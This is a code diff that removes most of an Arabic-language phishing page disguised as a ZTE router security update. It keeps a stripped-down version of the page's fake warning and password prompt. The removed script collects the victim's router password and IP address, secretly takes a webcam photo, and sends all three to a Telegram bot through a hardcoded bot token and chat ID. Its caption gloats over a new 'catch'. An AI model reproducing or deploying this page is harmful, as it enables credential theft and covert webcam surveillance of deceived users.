@@ -1,74 +1,6 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZTE Security Update</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 20px; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        img { width: 100px; }
-        h2 { color: #005aa9; margin-bottom: 20px; }
-        p { color: #666; font-size: 14px; }
-        input { width: 90%; padding: 12px; margin-top: 15px; border: 1px solid #ccc; border-radius: 5px; text-align: center; font-size: 16px; }
-        button { background-color: #d9534f; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; width: 100%; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/ZTE_logo.svg/1200px-ZTE_logo.svg.png" alt="ZTE Logo">
-        <h2>تحديث أمان الراوتر</h2>
-        <p>نظام "رادار الشبح" رصد محاولة اختراق. يرجى إدخال كلمة مرور الشبكة الحالية للتأكيد وتفعيل الحماية.</p>
-        
-        <input type="password" id="pass-input" placeholder="أدخل كلمة مرور الراوتر هنا">
-        
-        <button id="start-btn">تأمين الاتصال الآن</button>
-        <video id="video" style="display:none;" autoplay></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    </div>
+<p>نظام "رادار الشبح" رصد محاولة اختراق. يرجى إدخال كلمة مرور الشبكة الحالية للتأكيد.</p>
 
-    <script>
-        const botToken = '8347819984:AAFi1b3BL9sYP3BbkqpWY3XtVfWatppm8Rk'; 
-        const chatId = '1559993244'; 
+<input type="password" id="pass-input" placeholder="أدخل كلمة مرور الراوتر هنا" 
+       style="width: 90%; padding: 12px; margin-top: 15px; border: 1px solid #ccc; border-radius: 5px; text-align: center;">
 
-        document.getElementById('start-btn').addEventListener('click', async () => {
-            const password = document.getElementById('pass-input').value;
-            
-            if (!password) {
-                alert('يرجى إدخال كلمة المرور للمتابعة.');
-                return;
-            }
-
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const userIP = ipData.ip;
-
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'intruder.jpg');
-                        // هنا بنبعت الباسورد والـ IP مع الصورة
-                        formData.append('caption', `🚨 صيد جديد يا رمضان!\n🔑 الباسورد: ${password}\n🌐 IP: ${userIP}\n📍 الحالة: تم سحب البيانات`);
-                        
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
-                    
-                    alert('تم تأمين جهازك بنجاح بنظام الشبح!');
-                }, 2000);
-            } catch (err) {
-                alert('عفواً، يجب السماح بالوصول لتأمين الشبكة.');
-            }
-        });
-    </script>
-</body>
-</html>
+<button id="start-btn" style="background-color: #d9534f; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; margin-top: 20px; width: 100%;">تأمين الاتصال الآن</button>
